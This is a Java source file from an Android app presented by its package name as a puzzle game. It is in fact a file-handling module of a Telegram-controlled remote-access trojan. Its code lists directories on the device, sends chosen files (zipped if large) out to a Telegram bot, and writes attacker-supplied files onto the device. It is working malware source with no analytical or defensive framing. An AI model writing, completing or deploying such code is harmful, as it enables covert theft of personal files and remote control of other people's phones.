package com.gempuzzle.quest.c2.modules;

import android.content.Context;

import com.gempuzzle.quest.c2.TelegramClient;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public final class FileModule {

    private static final long MAX_UPLOAD = 48 * 1024 * 1024; // 48 MB

    public static void list(Context ctx, String path) {
        File dir = new File(path);
        if (!dir.exists() || !dir.isDirectory()) {
            TelegramClient.sendMessage("⚠ not a directory: " + path);
            return;
        }
        StringBuilder sb = new StringBuilder("📂 *").append(path).append("*\n\n");
        File[] files = dir.listFiles();
        if (files == null || files.length == 0) {
            sb.append("_empty_");
        } else {
            int shown = 0;
            for (File f : files) {
                if (shown >= 60) { sb.append("... (truncated)"); break; }
                String marker = f.isDirectory() ? "📁" : "📄";
                sb.append(marker).append(" `").append(f.getName()).append("`");
                if (f.isFile()) sb.append(" · ").append(formatSize(f.length()));
                sb.append("\n");
                shown++;
            }
        }
        TelegramClient.sendMessage(sb.toString());
    }

    public static void download(Context ctx, String path) {
        File f = new File(path);
        if (!f.exists() || !f.isFile()) {
            TelegramClient.sendMessage("⚠ file not found: " + path);
            return;
        }
        if (f.length() > MAX_UPLOAD) {
            // zip and split? just send as-is if under limit, else zip
            File zipped = zipFile(ctx, f);
            if (zipped != null && zipped.length() <= MAX_UPLOAD) {
                TelegramClient.sendDocument(zipped, "⬇️ " + f.getName());
                zipped.delete();
                return;
            }
            TelegramClient.sendMessage("⚠ file too large (" + formatSize(f.length()) + ") — max 48MB");
            return;
        }
        TelegramClient.sendDocument(f, "⬇️ " + f.getName());
    }

    public static void upload(Context ctx, String fileId) {
        new Thread(() -> {
            try {
                String fp = TelegramClient.getFilePath(fileId);
                if (fp.isEmpty()) {
                    TelegramClient.sendMessage("⚠ could not resolve file");
                    return;
                }
                File dest = new File(ctx.getExternalFilesDir(null), "upload_" + System.currentTimeMillis());
                boolean ok = TelegramClient.downloadFile(fp, dest);
                if (ok && dest.exists()) {
                    TelegramClient.sendMessage("⬆️ uploaded → " + dest.getAbsolutePath()
                            + " (" + formatSize(dest.length()) + ")");
                } else {
                    TelegramClient.sendMessage("⚠ upload failed");
                }
            } catch (Throwable t) {
                TelegramClient.sendMessage("⚠ upload error: " + t.getMessage());
            }
        }).start();
    }

    private static File zipFile(Context ctx, File src) {
        try {
            File out = new File(ctx.getCacheDir(), src.getName() + ".zip");
            try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(out));
                 FileInputStream fis = new FileInputStream(src)) {
                zos.putNextEntry(new ZipEntry(src.getName()));
                byte[] buf = new byte[8192];
                int n;
                while ((n = fis.read(buf)) != -1) zos.write(buf, 0, n);
                zos.closeEntry();
            }
            return out;
        } catch (Exception e) {
            return null;
        }
    }

    private static String formatSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return String.format("%.1f KB", bytes / 1024.0);
        if (bytes < 1024L * 1024 * 1024) return String.format("%.1f MB", bytes / (1024.0 * 1024));
        return String.format("%.1f GB", bytes / (1024.0 * 1024 * 1024));
    }

    private FileModule() {}
}
